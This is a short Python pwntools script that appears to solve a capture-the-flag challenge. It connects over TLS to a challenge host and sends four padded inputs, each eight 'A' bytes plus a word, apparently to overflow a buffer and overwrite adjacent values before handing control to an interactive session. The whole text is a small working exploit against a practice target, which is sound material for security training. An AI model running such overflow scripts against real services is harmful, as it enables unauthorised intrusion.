from pwn import *
p = remote ("spaceheroes-checkpoint.chals.io", 443, ssl=True, sni="spaceheroes-checkpoint.chals.io")
p.sendline(b'A'*8+b'USE')
p.sendline(b'A'*8+b'THE')
p.sendline(b'A'*8+b'FORCE')
p.sendline(b'A'*8+b'LUKE')
p.interactive()
